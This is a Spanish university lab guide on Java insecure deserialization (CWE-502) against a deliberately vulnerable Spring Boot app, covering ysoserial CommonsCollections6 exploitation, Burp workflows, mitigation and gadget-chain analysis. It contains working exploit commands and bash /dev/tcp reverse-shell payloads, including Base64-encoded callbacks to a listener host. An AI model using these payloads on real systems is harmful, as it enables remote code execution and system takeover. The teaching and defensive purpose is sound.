# Laboratorio: Deserialización Insegura en Java (CWE-502)

TPI — Seguridad en el Desarrollo de Software, UTN FRC.
Cantero Santiago (81658) — Arias Felipe (82412) — 4K3

Ver `../LAB.md` para marco teórico y objetivos completos. Este directorio
contiene el laboratorio funcional.

> ⚠️ Ejecutar solo en Docker aislado / localhost. No expone nada fuera de
> `127.0.0.1`. No usar los payloads generados contra otro sistema.

## Estructura

```
lab-deserializacion/
├── docker-compose.yml
├── target-app/        # App Spring Boot vulnerable (el "target")
├── exploit/           # Contenedor black box (ysoserial + script de ataque)
└── mitigation/        # Referencia de código corregido para el informe
```

## 1. Levantar el target

```bash
cd lab-deserializacion
docker-compose build target-app
docker-compose up -d target-app
```

Verificar que está arriba:

```bash
curl http://127.0.0.1:8080/cart/health
# -> vulnlab up
```

Flujo legítimo (lo que la app espera):

```bash
curl http://127.0.0.1:8080/cart/save
# -> Base64 de un Cart serializado. Empieza con "rO0" (= bytes 0xAC 0xED
#    en Base64), firma estándar de Java Object Serialization Stream.

curl -X POST http://127.0.0.1:8080/cart/restore \
  -H "Content-Type: text/plain" \
  --data "$(curl -s http://127.0.0.1:8080/cart/save)"
# -> Carrito restaurado con 2 items
```

El sink vulnerable está en
`target-app/src/main/java/com/tpi/vulnlab/controller/CartController.java`,
método `restore()`: deserializa cualquier Base64 recibido con
`ObjectInputStream.readObject()`, sin `ObjectInputFilter`, sin verificar
firma/HMAC, sin chequear que el tipo resultante sea `Cart` antes de
instanciarlo (el chequeo `instanceof Cart` ocurre **después** de que el
objeto ya se construyó y, en una gadget chain, después de que el código
arbitrario ya se ejecutó).

## 2. Explotación — caja negra

Simula un atacante sin acceso al código fuente: solo ve que `/cart/save`
devuelve algo que arranca con `rO0` (Base64 de la firma Java `0xACED`) y
que `/cart/restore` acepta ese mismo formato de vuelta. A partir de eso,
prueba librerías conocidas con gadget chains (ysoserial) hasta encontrar
una que el classpath del servidor acepte.

```bash
docker-compose build exploit
docker-compose run --rm exploit http://target-app:8080 "touch /tmp/pwned"
```

Confirmar RCE mirando dentro del contenedor target (el atacante real no
podría hacer esto, pero para el laboratorio sirve de prueba):

```bash
docker exec target-app ls -la /tmp | grep pwned
```

El script (`exploit/exploit.sh`) hace, en orden: fingerprint del endpoint,
pedido de un carrito legítimo para confirmar el formato, generación del
payload `CommonsCollections6` con ysoserial, y envío Base64 a
`/cart/restore`.

**Modo `PRINT_ONLY`** (para mostrar el ataque interceptando con Burp en
vez de que el script lo mande solo): genera el payload y lo imprime en
Base64 sin enviarlo, para pegarlo a mano en Burp Repeater sobre una
request real de checkout (ver sección 5).

```bash
docker-compose run --rm -e PRINT_ONLY=1 exploit http://target-app:8080
```

### 2.1 Metodología caja negra — sin ver el código en ningún momento

No hace falta el código fuente para detectar NI para explotar esto.
Secuencia real de reconocimiento:

1. **Firma de bytes.** Un objeto serializado Java arranca siempre con
   `0xAC 0xED` (magic number) + `0x00 0x05` (versión de protocolo). En
   Base64 eso arranca como `rO0AB...`. Cualquier blob largo en una
   cookie, parámetro oculto, header o body que empiece así es candidato
   — se detecta mirando tráfico (Burp), sin código.
2. **Comportamiento ante basura.** Mandar algo que no es un objeto
   serializado válido y recibir un error con forma de excepción Java de
   deserialización (`StreamCorruptedException`, `InvalidClassException`,
   `ClassNotFoundException`) confirma que del otro lado hay un
   `ObjectInputStream.readObject()`, no un parser JSON/XML.
3. **Fingerprint de la librería/gadget chain.** Sin saber qué hay en el
   classpath, se prueban gadget chains de ysoserial una por una
   (`CommonsCollections1-7`, `Spring1/2`, `Groovy1`, etc. — cada una
   asume una librería distinta) con un comando inocuo o un callback
   out-of-band, hasta que una dispare. Herramientas: ysoserial a mano,
   o Burp con la extensión **Java Deserialization Scanner**
   (automatiza el fuzzing).
4. **Confirmar RCE ciego.** Si la respuesta HTTP no refleja el
   resultado del comando (como en `/cart/restore`, que solo dice "tipo
   inesperado"), se confirma por canal lateral: out-of-band (el comando
   hace `curl`/`nslookup` a un Burp Collaborator o servidor propio),
   time-based (`sleep N`, medir el delay), o un archivo fijo leído por
   otro endpoint (técnica de harness que usa este lab en
   `/cart/debug-output`, no un vector real).

Esto es exactamente lo que hace `exploit.sh`: fingerprint con
`/cart/health`, chequeo de firma `0xACED` en `/cart/save`, prueba de
gadget chain, envío.

### 2.2 CVE asociado y dónde encontrar el PoC

La versión en uso (`commons-collections:3.1`, ver `pom.xml`) cae en el
rango vulnerable de:

- **CVE-2015-7501** — `InvokerTransformer`/`InstantiateFactory`/
  `InstantiateTransformer` del paquete `functors` deserializan sin
  restricción. Rango afectado: 3.0 a 3.2.1. Fix real en **3.2.2**
  (deserializar un `InvokerTransformer` pasa a tirar
  `UnsupportedOperationException`). CVSS 9.8 (CERT/CC).
- **CVE-2015-6420** — mismo rango de versiones, reportado casi en
  simultáneo.

**No hay entrada propia en Exploit-DB para este CVE** — caso típico
donde GitHub es la fuente primaria del PoC, no Exploit-DB: la librería
vulnerable no tiene "su" exploit — el exploit vive en cada producto que
la usa como dependencia (WebLogic, JBoss, Jenkins en 2015), por eso se
llama *gadget*, no vulnerabilidad directa de un endpoint puntual.

Cómo se busca en vivo (secuencia para mostrar en clase):
1. CVE → `nvd.nist.gov/vuln/detail/CVE-2015-7501` → sección
   "References" linkea a GitHub/avisos, no hay PoC propio en la ficha.
2. Buscar en GitHub `CVE-2015-7501` o `commons-collections exploit` →
   aparece **[frohoff/ysoserial](https://github.com/frohoff/ysoserial)**
   como estándar de facto — exactamente lo que `exploit/Dockerfile` ya
   clona y compila en este lab.
3. Mapa de referencia (qué gadget sirve para qué librería):
   **[grrrdog/java-deserialization-cheat-sheet](https://github.com/grrrdog/java-deserialization-cheat-sheet)**.

> **Nota sobre el gadget elegido**: `CommonsCollections1` entra vía
> `AnnotationInvocationHandler.readObject()`, que Oracle parchó desde
> JDK 8u71 (valida tipos después de deserializar) — en una imagen Java 8
> actualizada tira `IncompleteAnnotationException` y el comando **no**
> llega a ejecutarse. `CommonsCollections6` entra vía
> `HashSet/HashMap.readObject()` → `TiedMapEntry.hashCode()` → `LazyMap`
> → `ChainedTransformer` → `InvokerTransformer` → `Runtime.exec`, sin
> pasar por el código parcheado, por eso sigue funcionando. Verificado en
> este laboratorio: con CC1 el server responde con la excepción de la
> anotación y no hay RCE; con CC6 no hay excepción (`HashSet` llega a
> `instanceof Cart` y falla ahí, pero el comando ya se ejecutó) y el
> archivo aparece en `/tmp` del contenedor target.

## 3. Análisis — caja blanca

Con el código fuente a mano (`target-app/src/main/java/...`):

- **Sink**: `CartController.restore()` → `ObjectInputStream.readObject()`
  sobre `base64Payload` sin validar.
- **Gadget chain** (`CommonsCollections1`, ver `pom.xml`: `commons-collections:3.1`):
  `AnnotationInvocationHandler.readObject()` → invoca el `Map` interno al
  reconstruirse → si ese `Map` es un `TransformedMap`/`LazyMap` construido
  con un `ChainedTransformer` cuyo último eslabón es `InvokerTransformer`,
  la deserialización termina invocando reflexivamente
  `Runtime.getRuntime().exec(...)`. Ninguna de esas clases pertenece al
  dominio de la app — todas vienen de `commons-collections`, por eso basta
  con tenerla en el classpath, sin que el código de la app haga nada
  "raro" a propósito.
- Comparar con el punto de vista black box: el atacante infiere la
  vulnerabilidad por comportamiento (acepta datos binarios con firma Java,
  no los valida), el analista white box la confirma leyendo el sink y la
  versión exacta de la dependencia.

## 4. Mitigación

### Aplicada y probada en el target

`target-app/src/main/java/com/tpi/vulnlab/security/WhitelistObjectInputStream.java`
+ endpoint `POST /cart/restore-filtered` (mismo formato que `/restore`,
Base64 de un objeto serializado).

> **Nota real surgida al implementarla**: la receta estándar dice "usar
> `ObjectInputFilter` (JEP 290, Java ≥ 9)". Se intentó así primero, pero
> **`java.io.ObjectInputFilter` no existe en OpenJDK 8** (ni en la imagen
> de build `eclipse-temurin:8-jdk`, ni en el runtime `8-jre`, ambos con
> JDK 8u512) — esa API es Java 9+, o un backport propietario exclusivo de
> Oracle JDK, no de los builds comunitarios de OpenJDK 8. Se pivoteó a la
> técnica clásica, disponible desde Java 5: subclasear
> `ObjectInputStream` y sobrescribir `resolveClass()`, que corre para
> cada clase que el stream necesita resolver, antes de instanciarla. Es
> relevante para el informe: en un stack Java 8 real, "aplicar JEP 290"
> no es tan directo como suele describirse.

Prueba antes/después con el mismo payload (`CommonsCollections6`):

```bash
# Vulnerable: acepta y ejecuta
docker-compose run --rm exploit http://target-app:8080 "touch /tmp/pwned" /cart/restore
docker exec target-app ls /tmp | grep pwned        # -> existe

# Mitigado: rechaza antes de instanciar nada
docker-compose run --rm exploit http://target-app:8080 "touch /tmp/pwned2" /cart/restore-filtered
# -> Respuesta: "Rechazado por ObjectInputFilter: java.util.HashSet; ..."
docker exec target-app ls /tmp | grep pwned2       # -> no existe
```

### Otras mitigaciones (documentadas, no implementadas en el target)

Ver también `mitigation/CartControllerSecure.java` para más detalle:

1. Reemplazar serialización nativa de Java por JSON con tipo explícito
   (Jackson) — elimina `readObject()` del flujo por completo. Es la
   mitigación preferida en código nuevo; la whitelist de arriba es para
   cuando hay que mantener compatibilidad con Java serialization legacy.
2. Actualizar `commons-collections` a ≥ 3.2.2.
3. Firma/HMAC sobre el payload serializado como defensa en profundidad
   (no sustituye 1/2).

## 5. Front de demo — "TechStore" (visual, para la exposición con Burp)

`target-app/src/main/resources/static/index.html` — Spring Boot lo sirve
automático en `http://127.0.0.1:8080/` (mismo origen que la API, sin
problemas de CORS). Tienda narrativa en vez de botones abstractos —
hace tangible el "caso de uso legítimo" descrito en `../LAB.md` punto 3
(carrito persistido serializado en el cliente):

1. **Catálogo** (Notebook, Mouse, Teclado) + "Agregar al carrito" —
   100% cosmético, estado en JS, sin red. Decorativo: lo que se muestra
   como "comprado" no afecta el carrito real que viaja al servidor.
2. **"Ver carrito guardado"** (vulnerable) — dispara el request real:
   `GET /cart/save` (trae el carrito fijo persistido) →
   `POST /cart/restore` con ese Base64. **Este es el tráfico que se
   intercepta en Burp.**
3. **"Ver carrito guardado (seguro)"** (mitigado) — mismo flujo contra
   `POST /cart/restore-filtered`.
4. **Verificar RCE** (`GET /cart/debug-output`) — lee
   `/tmp/id_output.txt` y lo muestra en pantalla, sin terminal ni
   `docker exec` durante la demo.
5. **Log de actividad** — narra cada request (método, path, status) en
   vivo, debajo de todo.

### Demo con Burp Suite paso a paso

```bash
docker-compose up -d target-app
docker-compose build exploit
```

1. Abrir `http://127.0.0.1:8080/` con Burp como proxy del navegador.
2. Click en "Ver carrito guardado" → Burp intercepta el
   `POST /cart/restore` con el carrito legítimo en el body.
3. Mandar esa request a **Repeater**.
4. Generar el payload sin enviarlo (modo `PRINT_ONLY`, sección 2):
   ```bash
   docker-compose run --rm -e PRINT_ONLY=1 exploit http://target-app:8080
   ```
5. En Repeater, reemplazar el body (el carrito legítimo) por el Base64
   que imprimió el paso anterior. Enviar.
6. Volver al front, click en "Ver salida del comando ejecutado" →
   `uid=0(root) gid=0(root) groups=0(root)`.
7. **Para mostrar la mitigación**: mismo truco pero sobre "Ver carrito
   guardado (seguro)" → intercepta `/cart/restore-filtered` → mismo
   payload pegado → esta vez rechaza (`Rechazado por
   ObjectInputFilter: ...`).

Alternativa sin Burp (todo automático, como antes):

```bash
docker-compose run --rm exploit http://target-app:8080
# comando default: /bin/sh -c id>/tmp/id_output.txt
curl http://127.0.0.1:8080/cart/debug-output
```

> **Por qué `calc.exe` no es viable acá**: `target-app` corre en un
> contenedor Docker **Linux** (`eclipse-temurin:8-jdk`/`8-jre`), sin
> entorno gráfico Windows — no existe `calc.exe` adentro. Se evaluó correr
> el target directo en Windows host para esa PoC visual, pero se descartó
> por romper el aislamiento Docker del laboratorio. `id` cumple el mismo
> rol de prueba (comando arbitrario con salida verificable) sin ese costo.

> **Nota de endpoint**: `/cart/debug-output` es harness de la demo, no
> parte del vector de ataque real — lee un path **hardcodeado**, no
> recibido del cliente, para no introducir un path traversal nuevo en la
> app de prueba. Aclarar esto si se menciona en el informe/exposición.

> **Por qué el comando necesita `/bin/sh -c`**: `Runtime.exec(String)`
> tokeniza por espacios sin pasar por shell — `id > archivo` se ejecuta
> como `id` con argumentos `[">", "archivo"]`, no redirige nada. Por eso
> `exploit.sh` usa `/bin/sh -c id>/tmp/id_output.txt` (sin espacios
> alrededor de `>`, para que siga siendo un solo token al tokenizar).

## 6. Extensión Burp "Java Deserialization Scanner" — setup y uso

Alternativa con GUI al exploit manual/`exploit.sh`, usando la extensión de
Federico Dotta (HN Security): https://github.com/portswigger/java-deserialization-scanner.
Útil para la demo porque automatiza detección (timing/DNS) + explotación
(usa ysoserial internamente) desde Burp, sin editar scripts a mano.

### 6.1 Herramientas necesarias (versionadas en `tools/`)

La extensión necesita invocar `java -jar ysoserial.jar ...` como proceso
externo del **host** (no del contenedor). Dos problemas reales que
aparecieron al usarla y cómo se resolvieron:

1. **`ysoserial.jar` no viene embebido en la extensión** — hay que
   proveerlo. Se extrajo el que ya compila `exploit/Dockerfile` (mismo
   que usa `exploit.sh`, no uno nuevo):
   ```bash
   docker-compose build exploit
   docker create --name ysoserial-extract lab-deserializacion-exploit
   docker cp ysoserial-extract:/opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar tools/
   docker rm ysoserial-extract
   ```

2. **El JDK del host debe ser Java 8**, no uno más nuevo. Con JDK 9+
   (module system) los gadgets que tocan clases internas tiran
   `IllegalAccessError` (ej. `CommonsCollections3` necesita
   `com.sun.org.apache.xalan.internal...`, bloqueado por encapsulación de
   módulos fuera de JDK 8). Se bajó un JDK 8 portable (sin instalador, sin
   tocar el JDK del sistema):
   ```bash
   curl -L -o temurin8.zip "https://api.adoptium.net/v3/binary/latest/8/ga/windows/x64/jdk/hotspot/normal/eclipse?project=jdk"
   unzip temurin8.zip -d tools/
   ```

**Ubicación permanente en este repo** (versionada en git, ~250MB entre
JDK + ysoserial.jar + nc64.exe — repo pesado a propósito, para que el
lab sea reproducible clonando sin pasos extra):
```
lab-deserializacion/tools/jdk8u512-b09/bin/java.exe
lab-deserializacion/tools/ysoserial-0.0.6-SNAPSHOT-all.jar
lab-deserializacion/tools/nc64.exe
lab-deserializacion/tools/revshell_listener.py
```

### 6.2 Instalar la extensión en Burp

Burp → **Extensions → BApp Store** → buscar "Java Deserialization
Scanner" → Install. (Si no aparece en el BApp Store, bajar el jar de un
release de GitHub y Extensions → Add → seleccionar el jar manual.)

### 6.3 Configuración (una sola vez)

Tab de la extensión → **Configuration**:
- **java path** → ruta completa a `tools/jdk8u512-b09/bin/java.exe`
  (NO el `java` del PATH del sistema si ese es JDK 9+).
- **ysoserial jar path** → ruta completa a
  `tools/ysoserial-0.0.6-SNAPSHOT-all.jar`.

### 6.4 Puerto del target — conflicto con el proxy de Burp

Burp usa `127.0.0.1:8080` como proxy listener por default — el mismo
puerto que publica `target-app` en `docker-compose.yml`. Si Burp ya está
corriendo, `docker-compose up -d target-app` falla
(`ports are not available`). Mapear el target a otro puerto del host sin
tocar el `docker-compose.yml` versionado:
```bash
docker-compose build target-app
docker run -d --name target-app --network lab-deserializacion_lab-net \
  -p 127.0.0.1:8081:8080 lab-deserializacion-target-app
curl http://127.0.0.1:8081/cart/health   # -> vulnlab up
```
A partir de ahí, el **target** es `127.0.0.1:8081` y el **proxy** de
Burp sigue en `8080` — no confundir los dos puertos al configurar la
extensión ni al apuntar el navegador/curl al proxy.

### 6.5 Generar tráfico para la Proxy History

Con el navegador o `curl` usando el proxy de Burp (`127.0.0.1:8080`)
apuntando al target (`127.0.0.1:8081`):
```bash
curl -x http://127.0.0.1:8080 http://127.0.0.1:8081/cart/save
# tomar el Base64 de la respuesta y mandarlo de vuelta:
curl -x http://127.0.0.1:8080 -X POST http://127.0.0.1:8081/cart/restore \
  -H "Content-Type: text/plain" --data "<BASE64_DE_ARRIBA>"
```
Esto deja el request real de `/cart/restore` en la Proxy History de
Burp, con el carrito serializado en el body.

### 6.6 Manual testing (detección, no destructivo)

1. Click derecho sobre el `POST /cart/restore` en Proxy History →
   mandarlo a la tab **Manual testing** de la extensión (o pegar el
   request a mano).
2. Marcar el **insertion point**: todo el body (el Base64 completo),
   envuelto en `§...§`.
3. Content-Type debe quedar **`text/plain`** exacto (el endpoint tiene
   `consumes = "text/plain"` en `CartController.java:91` — cualquier otro
   Content-Type da `415` y el scan sale "NOT vulnerable" para TODO,
   uniforme, sin haber tocado nunca el sink real).
4. Encoding: **Base64**.
5. Run scan (payloads de tipo Sleep). Un chain real da un salto de
   tiempo grande (~10s vs ~1s de baseline) — NO hace falta que el
   baseline sea bajo (acá el baseline normal de la app es ~4-5ms por
   curl directo, pero a través de la extensión el "NOT vulnerable" basal
   también sale ~1000ms; lo que importa es el **delta** entre payloads,
   no el valor absoluto).

### 6.7 Exploiting (RCE real)

1. Tab **Exploiting** → mismo insertion point y Content-Type que en
   Manual testing.
2. Campo único de texto: **gadget + comando, separados por espacio,
   comando entre comillas si tiene espacios**. Formato que replica la
   CLI de ysoserial (`java -jar ysoserial.jar [payload] '[command]'`):
   ```
   CommonsCollections6 "/bin/sh -c id>/tmp/id_output.txt"
   ```
   - **Sin comillas** alrededor del comando, un comando con espacios se
     tokeniza mal (ej. `/bin/sh -c id>/tmp/id_output.txt` suelto se
     parte en 4 argumentos en vez de 2) y el proceso de ysoserial puede
     quedarse colgado generando el payload — matar el proceso
     `java.exe` colgado (Task Manager, o `Stop-Process`) y reintentar
     con comillas.
   - El mismo motivo de `exploit.sh` aplica acá: `/bin/sh -c` es
     necesario porque `Runtime.exec(String)` en el target tokeniza por
     espacios sin pasar por shell, y el comando interno va **sin
     espacios alrededor de `>`** para seguir siendo un solo token.
3. Click **Attack**.
4. La extensión no muestra el stdout del comando (`Runtime.exec` es
   ciego). Verificar el RCE igual que con `exploit.sh`:
   ```bash
   docker exec target-app cat /tmp/id_output.txt
   # -> uid=0(root) gid=0(root) groups=0(root)
   ```

### 6.8 Resultado por gadget contra este target (verificado)

Classpath real: solo `commons-collections:3.1` (`CC2`/`CC4` dependen de
`commons-collections4`, no presente — descartar directo).

| Gadget | Resultado | Causa |
|---|---|---|
| `CommonsCollections1` | ❌ No ejecuta | `AnnotationInvocationHandler.readObject()` parcheado desde JDK 8u71 (hallazgo ya conocido, ver sección 2.2) |
| `CommonsCollections3` | ❌ No ejecuta | `UnsupportedOperationException: Support for deserializing TemplatesImpl is disabled` — hardening de JDK8 que bloquea `TemplatesImpl` por default (`jdk.xml.enableTemplatesImplDeserialization=false`). **Hallazgo nuevo**, no estaba documentado antes de probar la extensión |
| `CommonsCollections5` | ❌ No ejecuta | Deserializa limpio como `BadAttributeValueExpException` sin disparar el chain — versiones de JDK8 actualizadas ya no llaman `toString()` automático sobre el valor envuelto durante `readObject()`. **Hallazgo nuevo** |
| `CommonsCollections6` | ✅ **RCE confirmado** | Entra vía `HashSet/HashMap.readObject()` → `TiedMapEntry.hashCode()` → `LazyMap`, no pasa por ninguna de las dos clases parcheadas de arriba. Verificado con `id`: `uid=0(root) gid=0(root) groups=0(root)` |
| `CommonsCollections7` | ⚠️ No confirmado con output verificable | Mismo patrón `LazyMap` que CC6 pero vía `Hashtable.readObject()`; en una prueba sin redirección dio `Error al restaurar carrito: null` — reintentar con el mismo formato `/bin/sh -c ...>archivo` antes de descartarlo |

Esto suma **tres mecanismos de hardening distintos** confirmados en este
JDK 8 real (parche de `AnnotationInvocationHandler`, bloqueo de
`TemplatesImpl`, bloqueo de `toString()` en `BadAttributeValueExpException`),
más allá de los dos hallazgos ya conocidos del lab — contenido nuevo para
la sección white box del informe.

## 7. Reverse shell (impacto real, mas alla de un comando puntual)

El target tiene `bash` pero no `nc`/`python`/`perl` con sockets utiles
(solo `perl` base) -- la via de reverse shell es el truco clasico de
`bash` con `/dev/tcp`.

### 7.1 Problema de tokenizacion y como se resuelve

El comando real tiene espacios:
```
bash -i >& /dev/tcp/<HOST>/<PUERTO> 0>&1
```
`Runtime.exec(String)` en el target (y el campo de comando de la
extension Burp, que replica la CLI de ysoserial) tokeniza por espacios
sin pasar por shell -- no se puede mandar ese comando tal cual (a
diferencia del truco simple `id>archivo` de la seccion 2, que no tiene
espacios). Solucion: **brace-expansion + Base64**, bypass estandar de
tokenizacion por espacios:
```
/bin/bash -c {echo,<BASE64_DEL_COMANDO>}|{base64,-d}|bash
```
Tokeniza en exactamente 3 argumentos (`/bin/bash`, `-c`, el script sin
espacios porque las comas dentro de `{}` no cuentan como separador).
Adentro, bash expande `{echo,X}` a `echo X`, decodifica el Base64 y lo
ejecuta.

### 7.2 Variante A -- listener en un container propio (red aislada, sin salir del lab)

```bash
# Listener en la misma red lab-net (nombre DNS: revshell-listener)
docker run -d --name revshell-listener --network lab-deserializacion_lab-net \
  --entrypoint sh lab-deserializacion-exploit -c "sleep 3600"
docker exec -d revshell-listener sh -c 'nc -lvnp 4444 > /tmp/revshell.log 2>&1'

# Payload (gadget CommonsCollections6) apuntando al nombre DNS del listener
RSHELL='bash -i >& /dev/tcp/revshell-listener/4444 0>&1'
B64=$(printf '%s' "$RSHELL" | base64 -w0)
docker run --rm --network lab-deserializacion_lab-net --entrypoint ./exploit.sh \
  lab-deserializacion-exploit http://target-app:8080 \
  "/bin/bash -c {echo,${B64}}|{base64,-d}|bash" /cart/restore

# Verificar / interactuar
docker exec -it revshell-listener sh   # despues conectar a la sesion nc si quedo en foreground,
                                        # o revisar /tmp/revshell.log si se corrio en background
```

### 7.3 Variante B -- listener en Windows host real (para la demo en vivo)

Mas fuerte para mostrar impacto: el container se conecta de vuelta al
**host real**, no a otro container.

**Requisito**: `host.docker.internal` tiene que resolver desde el
target (Docker Desktop lo agrega automaticamente a redes bridge
custom). Verificado:
```bash
docker exec target-app getent hosts host.docker.internal
# -> resuelve (IPv6 en este setup)
```

**Listener** -- dos opciones, usar la que este disponible:

a) `nc64.exe` (versionado en el repo):
   ```
   lab-deserializacion\tools\nc64.exe -lvnp 4444
   ```

b) Script Python (no requiere descargar nada, usa el `python` del
   WindowsApps que ya esta en PATH), guardado en
   `lab-deserializacion/tools/revshell_listener.py`:
   ```
   python lab-deserializacion\tools\revshell_listener.py 4444
   ```

**Importante**: el listener tiene que estar escuchando ANTES de
mandar el ataque -- si no, el `bash` del target no tiene a quien
conectarse y falla en silencio (sin excepcion visible en la respuesta
HTTP ni en los logs del target).

**Payload verificado y guardado** (puerto 4444, mismo Base64 para
`exploit.sh` manual o campo de comando de la extension Burp):
```
RSHELL='bash -i >& /dev/tcp/host.docker.internal/4444 0>&1'
# Base64: YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=
```

Comando completo via `exploit.sh`:
```bash
docker run --rm --network lab-deserializacion_lab-net --entrypoint ./exploit.sh \
  lab-deserializacion-exploit http://target-app:8080 \
  "/bin/bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=}|{base64,-d}|bash" \
  /cart/restore
```

Comando completo para el campo de la tab **Exploiting** de la
extension Burp (gadget + comando entre comillas, target
`http://127.0.0.1:8081/cart/restore`, mismo insertion point/encoding
Base64 de siempre):
```
CommonsCollections6 "/bin/bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=}|{base64,-d}|bash"
```

**Verificado funcionando end-to-end** (2026-11-16): conexion recibida,
shell interactiva como root dentro del container:
```
root@<container-id>:/app# id
uid=0(root) gid=0(root) groups=0(root)
root@<container-id>:/app# hostname
<container-id>
```

> **Nota de aislamiento**: esto cruza la frontera "solo containers" del
> `docker-compose.yml` hacia el host real (puerto abierto en `0.0.0.0`
> del Windows del usuario). Sigue siendo 100% local (nada sale a
> internet, `host.docker.internal` resuelve a la propia maquina), pero
> ya no es "container habla con container" -- vale la pena aclararlo en
> la exposicion: demuestra que el atacante no solo ejecuta un comando
> puntual, consigue control interactivo que podria pivotear mas alla
> del container si el host no estuviera aislado.

### 7.4 Si regeneran otro puerto o comando, reusar esta receta

```bash
RSHELL='bash -i >& /dev/tcp/<HOST>/<PUERTO> 0>&1'
B64=$(printf '%s' "$RSHELL" | base64 -w0)
echo "/bin/bash -c {echo,${B64}}|{base64,-d}|bash"
```
`<HOST>` = `host.docker.internal` (Windows host) o nombre DNS del
container listener dentro de `lab-net`.

## 8. Explotación desde White Box — guía paso a paso para la exposición

Pensada para que el compañero que tiene el código delante explique, a
nivel de programa, por qué el exploit funciona — sin necesidad de
fuzzing/fingerprinting ciego como en la sección 2 (eso es lo que hace
distinto al análisis white box del black box: acá no se prueban los 7
chains de Commons Collections a ver cuál pega, se sabe de antemano cuál
va a andar y por qué).

### 8.1 Encontrar el sink (dónde deserializa sin validar)

Buscar en el código cualquier uso de `ObjectInputStream.readObject()`
sobre datos que vienen del cliente:

```bash
grep -rn "readObject\|ObjectInputStream" target-app/src/main/java
```

Aparece en dos lugares — `CartController.java:91-110` (`/cart/restore`)
y `CartController.java:120-141` (`/cart/restore-filtered`). El primero
es el sink real:

```java
// CartController.java:91-92
@PostMapping(value = "/restore", consumes = "text/plain")
public String restore(@RequestBody String base64Payload) {
```
```java
// CartController.java:96-97
try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
    Object obj = ois.readObject(); // <-- sink: deserializa dato no confiable
```

**Lo que marca esto como vulnerable y no un `readObject()` cualquiera**:
- `new ObjectInputStream(...)` plano, sin override de `resolveClass()`
  ni ningún `ObjectInputFilter`.
- El dato (`base64Payload`) viene directo del body del request
  (`@RequestBody`), controlado por el cliente.
- El chequeo de tipo (`obj instanceof Cart`, línea 99) ocurre **después**
  de `readObject()` — para cuando se llega a esa línea, si el stream
  trae una gadget chain, el código arbitrario ya corrió. El `instanceof`
  no previene nada, solo decide qué devolver en la respuesta HTTP.

### 8.2 Identificar la librería vulnerable y su rango de CVEs

```bash
cat target-app/pom.xml | grep -A2 commons-collections
```
```xml
<groupId>commons-collections</groupId>
<artifactId>commons-collections</artifactId>
<version>3.1</version>
```

`3.1` cae en el rango vulnerable **3.0–3.2.1** de
**CVE-2015-7501**/**CVE-2015-6420** (detalle en sección 2.2). El fix
real está en 3.2.2, que convierte `InvokerTransformer.readObject()` en
una excepción explícita — por eso basta con tener la versión vieja en
el classpath, sin que la app haga nada "raro" a propósito.

### 8.3 Elegir el gadget correcto *a priori* (sin fuerza bruta)

Con el código a mano se sabe de entrada:
- La librería es `commons-collections:3.1` → los candidatos son
  `CommonsCollections1/3/5/6/7` (los que dependen de `3.1`; `CC2`/`CC4`
  necesitan `commons-collections4`, descartados sin probar nada —
  comparar con `target-app/target-app/Dockerfile` o el `pom.xml`, no
  hace falta fingerprinting ciego como en black box).
- El runtime es **JDK 8u512** (ver `target-app/Dockerfile`, comentario
  de la imagen `eclipse-temurin:8-jre`). Oracle parchó
  `AnnotationInvocationHandler.readObject()` desde **8u71+** — por lo
  tanto `CommonsCollections1` (que depende de esa clase) se descarta
  **antes de probarlo**, por lectura de versión, no por ensayo y error.
- `CommonsCollections6` entra por `HashSet/HashMap.readObject()` →
  `TiedMapEntry.hashCode()` → `LazyMap` — ninguna de esas clases es la
  parcheada. Es la elección directa, confirmada en este lab
  (`exploit.sh`, sección 2; extensión Burp, sección 6.8).

Esta es la diferencia real con black box: el atacante externo prueba
los 5 chains viables uno por uno hasta que algo responda distinto
(timing, DNS, side effect); el analista con código fuente va directo a
`CommonsCollections6` porque leyó la versión de la librería y el parche
del JDK, sin mandar un solo payload de prueba.

### 8.4 Mecánica del gadget chain, línea por línea (para explicar en vivo)

`CommonsCollections6` encadena clases de **la librería**, no del
programa de la víctima — nada en `CartController`/`Cart`/`CartItem`
participa del exploit, por eso cualquier app con esa librería en el
classpath es explotable igual:

1. **Punto de entrada**: el objeto serializado raíz es un
   `java.util.HashMap` (o `HashSet` según la variante) cuya clave es un
   `org.apache.commons.collections.keyvalue.TiedMapEntry`.
2. `HashMap.readObject()` (clase estándar del JDK) reconstruye el mapa
   llamando `put(key, value)` por cada entrada — y `put()` necesita
   `key.hashCode()` para ubicar el bucket.
3. `TiedMapEntry.hashCode()` **no calcula nada propio**: delega en
   `getValue()`, que llama `map.get(getKey())` sobre un mapa interno
   que en este payload es un
   `org.apache.commons.collections.map.LazyMap`.
4. `LazyMap.get(key)`: si la clave no existe todavía, en vez de
   devolver `null` como un mapa normal, **invoca un `Transformer`**
   guardado como "factory" y usa el resultado como valor — esa es la
   funcionalidad legítima de `LazyMap` (crear valores "lazy" bajo
   demanda) que el gadget abusa.
5. Ese `Transformer` es un
   `org.apache.commons.collections.functors.ChainedTransformer`, que
   ejecuta una lista de transformers en cadena, cada uno con el output
   del anterior como input:
   - `ConstantTransformer` → devuelve la constante `Runtime.class`
     (ignora el input, siempre da lo mismo).
   - `InvokerTransformer("getMethod", ...)` → sobre `Runtime.class`,
     invoca reflexivamente `.getMethod("getRuntime", null)` → devuelve
     el objeto `Method` de `Runtime.getRuntime()`.
   - `InvokerTransformer("invoke", ...)` → invoca ese `Method` sobre
     `null` (porque es estático) → devuelve la instancia `Runtime`
     real del proceso.
   - `InvokerTransformer("exec", ...)` → invoca `.exec(comando)` sobre
     esa instancia → **acá se ejecuta el comando**.
6. Todo esto corrió **dentro de `HashMap.readObject()`**, antes de que
   `CartController.restore()` llegue siquiera a la línea
   `Object obj = ois.readObject();` termine de retornar. El chequeo
   `obj instanceof Cart` de la línea 99 nunca se ejecuta a tiempo de
   prevenir nada — para cuando corre, el comando ya se ejecutó.

La clave para explicarlo simple: **`InvokerTransformer` es
"`Method.invoke()` en forma de objeto serializable"** — Apache
Commons Collections lo creó para poder usar reflexión dentro de
